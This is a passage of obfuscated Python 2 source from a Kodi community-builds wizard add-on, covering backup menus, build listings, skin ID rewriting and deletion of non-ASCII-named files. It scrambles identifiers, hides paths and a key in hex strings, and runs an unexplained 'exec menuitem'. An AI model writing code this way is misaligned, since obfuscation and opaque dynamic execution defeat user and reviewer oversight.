 for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( IiI1iiII1i1i ) :
  if 37 - 37: O00ooooo00 - II11iIiIIIiI % II1 / II11iIiIIIiI % i11Iii
  for file in oO0Ooo0OooOOo :
   I1I1IiIi1 . append ( file )
   if 48 - 48: i11iIiiIii % oooOooOOo0OO
 oo = len ( I1I1IiIi1 )
 if 29 - 29: ooo0O0O00 + i11iIiiIii % o0o
 for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( IiI1iiII1i1i ) :
  if 93 - 93: Iii % IIii1I
  OoIIi1iI [ : ] = [ OOOOI1iI1i11 for OOOOI1iI1i11 in OoIIi1iI ]
  oO0Ooo0OooOOo [ : ] = [ Oo0oO00 for Oo0oO00 in oO0Ooo0OooOOo ]
  if 90 - 90: o000O0o - II11iIiIIIiI / IIIIiiII111 / OOO0O0O0ooooo / o0o
  for file in oO0Ooo0OooOOo :
   if 87 - 87: Iii / Oo00oo0oO + IIii1I
   IiI1IIIII1I . append ( file )
   ii11 = len ( IiI1IIIII1I ) / float ( oo ) * 100
   I11 . update ( 0 , "Checking for non ASCII files" , '[COLOR yellow]%s[/COLOR]' % OOOOI1iI1i11 , 'Please Wait' )
   if 93 - 93: IIii1I + oooOooOOo0OO % i11Iii
   try :
    file . encode ( 'ascii' )
    if 21 - 21: II11iIiIIIiI
   except UnicodeDecodeError :
    iIiI1I1IIi11 = ( str ( OOOo00 ) + '/' + str ( file ) ) . replace ( '\\' , '/' ) . replace ( ':/' , ':\\' )
    if 9 - 9: i11Iii + ooo0O0O00 - o0o / O00ooooo00 % oOoO0o00OO0 / Oo00oo0oO
    print " non-ASCII file status logged successfully: " + iIiI1I1IIi11
    if oO000o0Oo00 != 1 :
     o0OooooO0O . write ( '[COLOR=dodgerblue]Non-ASCII File:[/COLOR]\n' )
     for oo0oO0oO in IIiIi11iiIi ( iIiI1I1IIi11 , 75 ) :
      o0OooooO0O . write ( oo0oO0oO + '[CR]' )
     o0OooooO0O . write ( '\n' )
    if oO000o0Oo00 == 1 :
     try :
      os . remove ( iIiI1I1IIi11 )
      print "### SUCCESS - deleted " + iIiI1I1IIi11
      o0OooooO0O . write ( '[COLOR=dodgerblue]SUCCESSFULLY DELETED:[/COLOR]\n' )
      for oo0oO0oO in IIiIi11iiIi ( iIiI1I1IIi11 , 75 ) :
       o0OooooO0O . write ( oo0oO0oO + '[CR]' )
      o0OooooO0O . write ( '\n' )
      if 48 - 48: Oo00oo0oO % o0o
     except :
      print "######## FAILED TO REMOVE: " + iIiI1I1IIi11
      print "######## Make sure you manually remove this file ##########"
      OoOOO0OooO . write ( '[COLOR=red]FAILED TO DELETE:[/COLOR]\n' )
      for oo0oO0oO in IIiIi11iiIi ( iIiI1I1IIi11 , 75 ) :
       OoOOO0OooO . write ( oo0oO0oO + '[CR]' )
      OoOOO0OooO . write ( '\n' )
      if 3 - 3: Oo00oo0oO % IIIIiiII111 + iiII11i1I1IIi
 OoOOO0OooO . close ( )
 o0OooooO0O . close ( )
 if 47 - 47: OOO0O0O0ooooo * o000O0o * o0oo . Ooo00oOo0oOo
 if 95 - 95: IIIIiiII111 % Oo00oo0oO . OOO0O0O0ooooo % OoOo0o
 o0OooooO0O = open ( oOoOooOo0o0 , mode = 'r' )
 OOO = o0OooooO0O . read ( )
 o0OooooO0O . close ( )
 OoOOO0OooO = open ( OOOO , mode = 'r' )
 ii1i1iiI = OoOOO0OooO . read ( )
 OoOOO0OooO . close ( )
 if OOO == '' and ii1i1iiI == '' :
  i11 . ok ( 'No Special Characters Found' , 'Great news, all filenames in the path you scanned are ASCII based - no special characters found.' )
 else :
  Oo0oOo0ooOOOo = open ( I1IIIii , mode = 'w+' )
  Oo0oOo0ooOOOo . write ( OOO + '\n\n' + ii1i1iiI )
  Oo0oOo0ooOOOo . close ( )
  OoO0000o = open ( I1IIIii , mode = 'r' )
  o0Ii1 = OoO0000o . read ( )
  OoO0000o . close ( )
  IIi1IiII ( 'Final Results' , o0Ii1 )
  os . remove ( I1IIIii )
 os . remove ( oOoOooOo0o0 )
 os . remove ( OOOO )
 if 65 - 65: Oo00oo0oO . O00ooooo00
 if 95 - 95: o000O0o + o000O0o - II11iIiIIIiI - ooo0O0O00
def i1i ( ) :
 OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue]How to create and share my build[/COLOR]' , '' , 'instructions_1' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 OOo0oO00ooO00 ( '' , '[COLOR=gold]-----------------------------------------------------------------[/COLOR]' , '' , '' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Create Community Build (for sharing on CP only)' , 'url' , 'community_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 if i1iIIi11i111I ( ) :
  OOo0oO00ooO00 ( '' , 'Create OpenELEC Backup (full backup can only be used on OpenELEC)' , 'none' , 'openelec_backup' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Create Universal Build (local backups only)' , 'none' , 'community_backup_2' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Create Full Backup (will only work on THIS device)' , 'local' , 'local_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 OOo0oO00ooO00 ( '' , 'Backup Addons Only' , 'addons' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Addons' )
 OOo0oO00ooO00 ( '' , 'Backup Addon Data Only' , 'addon_data' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Addon Userdata' )
 OOo0oO00ooO00 ( '' , 'Backup Guisettings.xml' , iiI1IiI , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your guisettings.xml' )
 if 16 - 16: o000O0o . IIii1I
 if os . path . exists ( II11iiii1Ii ) :
  OOo0oO00ooO00 ( '' , 'Backup Favourites.xml' , II11iiii1Ii , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your favourites.xml' )
  if 27 - 27: i11iIiiIii - o000O0o
 if os . path . exists ( OO0oOoo ) :
  OOo0oO00ooO00 ( '' , 'Backup Source.xml' , OO0oOoo , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your sources.xml' )
  if 35 - 35: II1 - OoOo0o / o0oo
 if os . path . exists ( O0o0Oo ) :
  OOo0oO00ooO00 ( '' , 'Backup Advancedsettings.xml' , O0o0Oo , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your advancedsettings.xml' )
  if 50 - 50: Iii
 if os . path . exists ( O00o0OO ) :
  OOo0oO00ooO00 ( '' , 'Backup Advancedsettings.xml' , O00o0OO , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your keyboard.xml' )
  if 33 - 33: o0o
 if os . path . exists ( O0O ) :
  OOo0oO00ooO00 ( '' , 'Backup RssFeeds.xml' , O0O , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your RssFeeds.xml' )
  if 98 - 98: Iii % Ooo00oOo0oOo
  if 95 - 95: IIii1I - OoOo0o - II11iIiIIIiI + OoOo0o % oOoO0o00OO0 . o000O0o
def IiiIIi1 ( ) :
 OOo0oO00ooO00 ( 'folder' , 'Backup My Content' , 'none' , 'backup_option' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Restore My Content' , 'none' , 'restore_option' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 28 - 28: o0ii1I
 if 45 - 45: o0ii1I . o000O0o / OoOo0o - iiII11i1I1IIi * IIii1I
def ooO00o ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://repos/",return)' )
 if 73 - 73: ooo0O0O00 * ooo0O0O00 / i11Iii
 if 43 - 43: oOoO0o00OO0 . O00ooooo00 . Oo00oo0oO + OOO0O0O0ooooo * IIIIiiII111 * OOO0O0O0ooooo
def II11ii ( ) :
 if 39 - 39: ooo0O0O00 . o000O0o * Iii - i11iIiiIii
 ooo0ooO = os . path . join ( i1iiIII111ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) , 'tag.cfg' )
 if os . path . exists ( ooo0ooO ) :
  o0o0O0O00oOOo = open ( ooo0ooO , 'r' )
  oOo0O = o0o0O0O00oOOo . read ( )
  o0o0O0O00oOOo . close ( )
  return binascii . unhexlify ( oOo0O )
 else :
  return binascii . unhexlify ( '6e6c616b73646a666c6b61736a64666c6a616c736b6a666c6b616a7366' )
  if 1 - 1: ooo0O0O00 * Iii
  if 66 - 66: Iii + O00ooooo00 % Ooo00oOo0oOo . OOO0O0O0ooooo * oOoO0o00OO0 % oOoO0o00OO0
def O0oOO0o ( localbuildcheck , localversioncheck , id , welcometext , livemsg ) :
 iiiiI1IiI1I1 ( )
 if livemsg != 'none' :
  try :
   exec menuitem
   OOo0oO00ooO00 ( '' , '[COLOR=orange]---------------------------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  except :
   pass
 if ( Oo . replace ( '%20' , ' ' ) in welcometext ) and ( 'elc' in welcometext ) and Oo != '' :
  OOo0oO00ooO00 ( '' , welcometext , 'show' , 'user_info' , '' , '' , '' , '' )
  if 19 - 19: IIIIiiII111
 if id != 'None' :
  if 55 - 55: II11iIiIIIiI % II11iIiIIIiI / OOO0O0O0ooooo % ooo0O0O00 - o0ii1I . iiII11i1I1IIi
  if id != 'Local' :
   iiiii1I1III1 = i1oO00O ( localbuildcheck , localversioncheck , id )
   if 77 - 77: i11iIiiIii % O00ooooo00 % Oo00oo0oO
   if iiiii1I1III1 == True :
    if 15 - 15: IIii1I . OOO0O0O0ooooo
    if not 'Partially installed' in localbuildcheck :
     OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]' + localbuildcheck + ':[/COLOR] [COLOR=lime]NEW VERSION AVAILABLE[/COLOR]' , id , 'showinfo' , '' , '' , '' , '' )
     if 70 - 70: IIIIiiII111 . i11iIiiIii % IIIIiiII111 . OOO0O0O0ooooo - IIii1I
    if '(Partially installed)' in localbuildcheck :
     OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo2' , '' , '' , '' , '' )
   else :
    OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo' , '' , '' , '' , '' )
    if 26 - 26: II11iIiIIIiI
  else :
   if 76 - 76: O00ooooo00 * II1 * OOO0O0O0ooooo + OoOo0o * OoOo0o
   if localbuildcheck == 'Incomplete' :
    OOo0oO00ooO00 ( '' , '[COLOR=darkcyan]Your last restore is not yet completed[/COLOR]' , 'url' , i1iIiIii ( ) , '' , '' , '' , '' )
    if 20 - 20: o0ii1I * i11Iii
   else :
    OOo0oO00ooO00 ( '' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]Local Build (' + localbuildcheck + ')[/COLOR]' , '' , '' , '' , '' , '' , '' )
 i1III1iI = 0
 if 38 - 38: IIii1I / i11Iii
 if os . path . exists ( oO ) :
  for OOo0 in os . listdir ( oO ) :
   if OOo0 != 'Master' :
    i1III1iI += 1
    if 13 - 13: IIii1I
  if i1III1iI > 1 :
   OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Switch Build Profile[/COLOR]' , localbuildcheck , 'switch_profile_menu' , '' , '' , '' , '' )
   if 77 - 77: i11iIiiIii - IIii1I / oooOooOOo0OO / i11Iii / o0oo
 OOo0oO00ooO00 ( '' , '[COLOR=orange]---------------------------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
 if 56 - 56: II1 * OOO0O0O0ooooo
 if not 'elc' in welcometext :
  OOo0oO00ooO00 ( '' , welcometext , 'None' , 'register' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , '[COLOR=yellow]Settings[/COLOR]' , 'settings' , 'addon_settings' , 'mainmenu/settings.png' , '' , '' , '' )
 if 85 - 85: II1 % Iii * IIii1I
 if 44 - 44: IIii1I . oOoO0o00OO0 + OoOo0o . i11Iii
 OOo0oO00ooO00 ( 'folder' , 'Add-on Portal' , '' , 'addonmenu' , 'mainmenu/addons.png' , '' , '' , '' )
 if 7 - 7: oOoO0o00OO0 + IIii1I * o0o * o0o / Ooo00oOo0oOo - IIIIiiII111
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  OOo0oO00ooO00 ( 'folder' , 'App Installer' , '' , 'app_installer' , 'mainmenu/apps.png' , '' , '' , '' )
  if 65 - 65: oooOooOOo0OO + Iii + Ooo00oOo0oOo
 OOo0oO00ooO00 ( 'folder' , 'Community Builds' , '' , 'CB_Menu' , 'mainmenu/builds.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Keyword Installer' , '' , 'nan_menu' , 'mainmenu/keyword.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Tutorials' , '' , 'tutorial_root_menu' , 'mainmenu/tuts.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Maintenance' , 'none' , 'tools' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 77 - 77: Ooo00oOo0oOo
 if 50 - 50: OOO0O0O0ooooo . OOO0O0O0ooooo . i11Iii % iiII11i1I1IIi
def ooo000oOO ( ) :
 if os . path . exists ( oO0Oo ) :
  shutil . rmtree ( oO0Oo )
  if 27 - 27: o0ii1I * i11iIiiIii * o0oo
 if not os . path . exists ( oO0Oo ) :
  os . makedirs ( oO0Oo )
  if 92 - 92: iiII11i1I1IIi / i11iIiiIii + oOoO0o00OO0
 oOo0Oo0O0O = III1II1i ( )
 iI1i1IiIIIIi = oOOOOoOO0o ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' , 10 )
 if 65 - 65: OOO0O0O0ooooo * o000O0o / o000O0o . Iii
 I11 . create ( 'Backing Up Add-ons' , '' , 'Please Wait...' )
 if 87 - 87: Ooo00oOo0oOo * oOoO0o00OO0 % iiII11i1I1IIi * iiII11i1I1IIi
 for OOo0 in os . listdir ( i1iiIII111ii ) :
  if 58 - 58: II11iIiIIIiI . o0ii1I + o000O0o % iiII11i1I1IIi - o0oo
  if 50 - 50: ooo0O0O00 % Ooo00oOo0oOo - i11Iii . O00ooooo00 + OOO0O0O0ooooo % ooo0O0O00
  if not 'totalinstaller' in OOo0 and not 'plugin.program.tbs' in OOo0 and not 'packages' in OOo0 and os . path . isdir ( os . path . join ( i1iiIII111ii , OOo0 ) ) :
   if 10 - 10: ooo0O0O00 . O00ooooo00 + IIIIiiII111
   if 66 - 66: o0oo % o0ii1I
   if OOo0 in iI1i1IiIIIIi and not OOo0 in oOo0Oo0O0O and not 'repo.' in OOo0 and not 'repository.' in OOo0 and os . path . isdir ( os . path . join ( i1iiIII111ii , OOo0 ) ) :
    if 21 - 21: Iii - II1 % i11iIiiIii
    if 71 - 71: O00ooooo00 - o0o * OoOo0o + oooOooOOo0OO - o0oo % oOoO0o00OO0
    if not 'service.xbmc.versioncheck' in OOo0 and not 'packages' in OOo0 and os . path . isdir ( os . path . join ( i1iiIII111ii , OOo0 ) ) :
     if 63 - 63: IIii1I + II11iIiIIIiI . o0oo / o000O0o
     try :
      I11 . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % OOo0 , 'Please Wait...' )
      os . makedirs ( os . path . join ( oO0Oo , OOo0 ) )
      if 84 - 84: O00ooooo00
      iI1I1iII1i = os . path . join ( oO0Oo , OOo0 , 'addon.xml' )
      IiIIiii1I = os . path . join ( oO0Oo , OOo0 , 'default.py' )
      ooooo0Oo0 = open ( os . path . join ( i1iiIII111ii , OOo0 , 'addon.xml' ) , mode = 'r' )
      oOo0O = ooooo0Oo0 . read ( )
      ooooo0Oo0 . close ( )
      if 97 - 97: Oo00oo0oO . oooOooOOo0OO . Oo00oo0oO
      oOo00o = re . compile ( ' name="(.+?)"' ) . findall ( oOo0O )
      II111i1ii1iII = re . compile ( 'provider-name="(.+?)"' ) . findall ( oOo0O )
      ooo0OoO = re . compile ( '<addon[\s\S]*?">' ) . findall ( oOo0O )
      iiI1111I11i1I = re . compile ( '<description[\s\S]*?<\/description>' ) . findall ( oOo0O )
      o0ooooO0o0O = oOo00o [ 0 ] if ( len ( oOo00o ) > 0 ) else 'None'
      o0000oO = II111i1ii1iII [ 0 ] if ( len ( II111i1ii1iII ) > 0 ) else 'Anonymous'
      O00oOo0O0o00O = ooo0OoO [ 0 ] if ( len ( ooo0OoO ) > 0 ) else 'None'
      iI1II = iiI1111I11i1I [ 0 ] if ( len ( iiI1111I11i1I ) > 0 ) else 'None'
      if 91 - 91: Ooo00oOo0oOo * ooo0O0O00 . O00ooooo00
      II11Ii111II1 = '<addon id="' + OOo0 + '" name="' + o0ooooO0o0O + '" version="0" provider-name="' + o0000oO + '">'
      OOO0oOoO0O = '<description>If you\'re seeing this message it means the add-on is still updating, please wait for the update process to complete.</description>'
      if 72 - 72: ooo0O0O00 % o0ii1I % oooOooOOo0OO + o0o % i11iIiiIii + OOO0O0O0ooooo
      if O00oOo0O0o00O != 'None' :
       iIIIiIi = oOo0O . replace ( iI1II , OOO0oOoO0O ) . replace ( O00oOo0O0o00O , II11Ii111II1 )
       if 65 - 65: IIii1I % oooOooOOo0OO + OOO0O0O0ooooo / II1
      else :
       iIIIiIi = oOo0O . replace ( iI1II , OOO0oOoO0O )
       if 52 - 52: IIIIiiII111 % II11iIiIIIiI * o000O0o % o0o + II11iIiIIIiI / ooo0O0O00
      oo0O0 = open ( iI1I1iII1i , mode = 'w+' )
      oo0O0 . write ( str ( iIIIiIi ) )
      oo0O0 . close ( )
      oo000oOO00o0oOO = open ( IiIIiii1I , mode = 'w+' )
      oo000oOO00o0oOO . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + OOo0 + '"\nAddonName="' + o0ooooO0o0O + '"\ndialog=xbmcgui.Dialog()\ndialog.ok(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating so we recommend waiting a few minutes to see if it updates naturally. If it hasn\'t updated after 5mins please try reinstalling via the Community Portal add-on")\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
      oo000oOO00o0oOO . close ( )
      if 27 - 27: iiII11i1I1IIi
     except :
      print "### Failed to backup: " + OOo0
      if 95 - 95: o0o
      if 44 - 44: II11iIiIIIiI + o0o . Oo00oo0oO / Ooo00oOo0oOo % IIii1I + Oo00oo0oO
   else :
    try :
     shutil . copytree ( os . path . join ( i1iiIII111ii , OOo0 ) , os . path . join ( oO0Oo , OOo0 ) )
    except :
     print "### Failed to copy: " + OOo0
     if 61 - 61: II11iIiIIIiI / o0oo + Ooo00oOo0oOo . oooOooOOo0OO / iiII11i1I1IIi * II11iIiIIIiI
 I11 . close ( )
 if 46 - 46: IIii1I
 I111iiiii1 = "Creating Backup"
 OO0ooOoOO0OOo = "Archiving..."
 OooOoooo0000 = ""
 I1ii1i11i = "Please Wait"
 if 86 - 86: OOO0O0O0ooooo % O00ooooo00 . Ooo00oOo0oOo . o0o
 o00Ooo0 ( oO0Oo , oOOoo0Oo , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , '' , '' )
 if 44 - 44: i11iIiiIii * o0o + Iii + Oo00oo0oO * OOO0O0O0ooooo . Oo00oo0oO
 try :
  shutil . rmtree ( oO0Oo )
  if 19 - 19: Ooo00oOo0oOo - Oo00oo0oO
 except :
  print "### COMMUNITY BUILDS: Failed to remove temp addons folder - manual delete required ###"
  if 59 - 59: o0ii1I * o0oo - IIIIiiII111 . II11iIiIIIiI
  if 89 - 89: II11iIiIIIiI
def o00oo0OO0 ( url ) :
 I11 . create ( 'Cleaning Temp Paths' , '' , 'Please wait...' )
 if os . path . exists ( oO0Oo ) :
  shutil . rmtree ( oO0Oo )
  if 60 - 60: i11Iii
 if not os . path . exists ( oO0Oo ) :
  os . makedirs ( oO0Oo )
  if 66 - 66: o0o / i11Iii % O00ooooo00 - oooOooOOo0OO . OOO0O0O0ooooo / OOO0O0O0ooooo
 extract . all ( oOOoo0Oo , oO0Oo , I11 )
 if 96 - 96: II1 + Oo00oo0oO * OOO0O0O0ooooo
 for OOo0 in os . listdir ( oO0Oo ) :
  if 86 - 86: IIIIiiII111
  if not 'totalinstaller' in OOo0 and not 'plugin.program.tbs' in OOo0 :
   if not os . path . exists ( os . path . join ( i1iiIII111ii , OOo0 ) ) :
    os . rename ( os . path . join ( oO0Oo , OOo0 ) , os . path . join ( i1iiIII111ii , OOo0 ) )
    I11 . update ( 0 , "Installing: [COLOR=yellow]" + OOo0 + '[/COLOR]' , '' , 'Please wait...' )
    print "### Successfully installed: " + OOo0
    if 29 - 29: IIii1I - o0oo + o000O0o % IIii1I % II11iIiIIIiI
   else :
    print "### " + OOo0 + " Already exists on system"
    if 84 - 84: Oo00oo0oO + oOoO0o00OO0 + IIIIiiII111 + ooo0O0O00
    if 62 - 62: i11iIiiIii + Iii + O00ooooo00
def oOOoO0O ( welcometext ) :
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  iII1 = iIiIii1ii ( )
  i1IiiiiiIiII = os . path . join ( iII1 , 'Download' )
  try :
   if not os . path . exists ( i1IiiiiiIiII ) :
    os . makedirs ( i1IiiiiiIiII )
  except :
   xbmc . log ( "### Failed to make download folder" )
   if 26 - 26: o0ii1I . IIii1I
 oOo0I1Ii11i = xbmc . getInfoLabel ( "System.BuildVersion" )
 I1iIiiiI1 = float ( oOo0I1Ii11i [ : 2 ] )
 IIIIIo0ooOoO000oO = int ( I1iIiiiI1 )
 if 87 - 87: Iii - i11Iii - II11iIiIIIiI + iiII11i1I1IIi % IIii1I / i11iIiiIii
 if I11i11Ii == 'true' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Show My Private List[/COLOR]' , '&visibility=private' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 12 - 12: i11Iii
 if ( IIIIIo0ooOoO000oO < 14 ) or ( IiiIII111iI == 'true' ) :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Show All Gotham Compatible Builds[/COLOR]' , '&xbmc=gotham&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 86 - 86: oooOooOOo0OO - o0oo
 if ( IIIIIo0ooOoO000oO == 14 ) or ( IiiIII111iI == 'true' ) :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Show All Helix Compatible Builds[/COLOR]' , '&xbmc=helix&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 63 - 63: o000O0o / Iii + II1 . o0o . i11Iii
 if ( IIIIIo0ooOoO000oO == 15 ) or ( IiiIII111iI == 'true' ) :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Show All Isengard Compatible Builds[/COLOR]' , '&xbmc=isengard&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if ( IIIIIo0ooOoO000oO == 16 ) or ( IiiIII111iI == 'true' ) :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Show All Jarvis Compatible Builds[/COLOR]' , '&xbmc=jarvis&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 48 - 48: O00ooooo00 - ooo0O0O00 - i11iIiiIii . o0o - ooo0O0O00 * o0o
 if i1i1II == 'false' :
  OOo0oO00ooO00 ( '' , '[COLOR=gold]How to fix builds broken on other wizards![/COLOR]' , '' , 'instructions_5' , 'mainmenu/builds.png' , '' , '' , '' )
 if O0oo0OO0 != '' and i1i1II == 'true' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Show ' + I1i1iiI1 + ' Builds[/COLOR]' , '&id=1' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if iiIIIII1i1iI != '' and i1i1II == 'true' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Show ' + o0oO0 + ' Builds[/COLOR]' , '&id=2' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if oo00 != '' and i1i1II == 'true' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Show ' + o00 + ' Builds[/COLOR]' , '&id=3' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if Oo0oO0ooo != '' and i1i1II == 'true' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Show ' + o0oOoO00o + ' Builds[/COLOR]' , '&id=4' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if i1 != '' and i1i1II == 'true' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]Show ' + oOOoo00O0O + ' Builds[/COLOR]' , '&id=5' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Create My Own Community Build' , 'url' , 'backup_option' , 'mainmenu/builds.png' , '' , '' , 'Back Up Your Full System' )
 if 60 - 60: Iii / oOoO0o00OO0 + II11iIiIIIiI - ooo0O0O00
 if 49 - 49: o0oo - OOO0O0O0ooooo / o0oo * Iii + OoOo0o
def Iiii1I ( skin ) :
 Ooo000000 = '<onleft>%s</onleft>'
 Oo00ooOoO = '<onright>%s</onright>'
 ooo0 = '<onup>%s</onup>'
 i1iiIIiiiII = '<ondown>%s</ondown>'
 Ii1I1 = '<control type="button" id="%s">'
 if 71 - 71: Iii + IIii1I * oooOooOOo0OO . OoOo0o % i11iIiiIii % IIii1I
 if 63 - 63: II1 * o0oo / o0o - oooOooOOo0OO . IIii1I + ooo0O0O00
 ii1IIiI1IIi = [
 ( '65' , '140' ) ,
 ( '66' , '164' ) ,
 ( '67' , '162' ) ,
 ( '68' , '142' ) ,
 ( '69' , '122' ) ,
 ( '70' , '143' ) ,
 ( '71' , '144' ) ,
 ( '72' , '145' ) ,
 ( '73' , '127' ) ,
 ( '74' , '146' ) ,
 ( '75' , '147' ) ,
 ( '76' , '148' ) ,
 ( '77' , '166' ) ,
 ( '78' , '165' ) ,
 ( '79' , '128' ) ,
 ( '80' , '129' ) ,
 ( '81' , '120' ) ,
 ( '82' , '123' ) ,
 ( '83' , '141' ) ,
 ( '84' , '124' ) ,
 ( '85' , '126' ) ,
 ( '86' , '163' ) ,
 ( '87' , '121' ) ,
 ( '88' , '161' ) ,
 ( '89' , '125' ) ,
 ( '90' , '160' ) ]
 if 76 - 76: ooo0O0O00 / o0oo + Iii
 for Oooo00 , iii1II1iI1IIi in ii1IIiI1IIi :
  Ii11iiI1 = open ( skin ) . read ( )
  oO0O = Ii11iiI1 . replace ( Ii1I1 % Oooo00 , Ii1I1 % iii1II1iI1IIi ) . replace ( Ooo000000 % Oooo00 , Ooo000000 % iii1II1iI1IIi ) . replace ( Oo00ooOoO % Oooo00 , Oo00ooOoO % iii1II1iI1IIi ) . replace ( ooo0 % Oooo00 , ooo0 % iii1II1iI1IIi ) . replace ( i1iiIIiiiII % Oooo00 , i1iiIIiiiII % iii1II1iI1IIi )
  Oo0oO00 = open ( skin , mode = 'w' )
  Oo0oO00 . write ( oO0O )
  Oo0oO00 . close ( )
  if 70 - 70: o0oo % o000O0o / o000O0o . o0o % i11Iii . Ooo00oOo0oOo
def I1ii1Ii1 ( u , skin ) :
 Ooo000000 = '<onleft>%s</onleft>'
 Oo00ooOoO = '<onright>%s</onright>'
 ooo0 = '<onup>%s</onup>'
 i1iiIIiiiII = '<ondown>%s</ondown>'
 Ii1I1 = '<control type="button" id="%s">'
 if 73 - 73: OOO0O0O0ooooo . oooOooOOo0OO + i11iIiiIii + IIii1I - o0o / Iii
 if u < 49 :
  OO0OOOOo0000O = u + 61
  if 25 - 25: ooo0O0O00 - iiII11i1I1IIi
 else :
  OO0OOOOo0000O = u + 51
  if 10 - 10: OOO0O0O0ooooo % Oo00oo0oO . o0oo + o0ii1I + oOoO0o00OO0
 Ii11iiI1 = open ( skin ) . read ( )
 oO0O = Ii11iiI1 . replace ( Ooo000000 % u , Ooo000000 % OO0OOOOo0000O ) . replace ( Oo00ooOoO % u , Oo00ooOoO % OO0OOOOo0000O ) . replace ( ooo0 % u , ooo0 % OO0OOOOo0000O ) . replace ( i1iiIIiiiII % u , i1iiIIiiiII % OO0OOOOo0000O ) . replace ( Ii1I1 % u , Ii1I1 % OO0OOOOo0000O )
 Oo0oO00 = open ( skin , mode = 'w' )
 Oo0oO00 . write ( oO0O )
 Oo0oO00 . close ( )
 if 52 - 52: Iii / o0oo + OoOo0o
def Iii1i11iiI1 ( description ) :
 oOOoOooO0oO0o = os . path . join ( oO , 'extracted' )
 o0o0OoO0OOO0 = os . path . join ( oO , 'temp' )
 oO0OOOO0o0 = os . path . join ( oOOoOooO0oO0o , 'userdata' , '.cbcfg' )
 oOO0 = os . path . join ( oO , description , 'addonlist' )
 O00O00OoO = open ( oOO0 , 'w+' )
 IiIiI1i1 = [ ]
 if 18 - 18: IIIIiiII111
 if not os . path . exists ( os . path . join ( oO , description ) ) :
  os . makedirs ( os . path . join ( oO , description ) )
  if IiII == 'true' :
   xbmc . log ( "### Created: %s" % os . path . join ( oO , description ) )
 if not os . path . exists ( i1iiIIiiI111 ) :
  os . makedirs ( i1iiIIiiI111 )
  if IiII == 'true' :
   xbmc . log ( "### Created: %s" % i1iiIIiiI111 )
 if os . path . exists ( o0o0OoO0OOO0 ) :
  shutil . rmtree ( o0o0OoO0OOO0 )
  if IiII == 'true' :
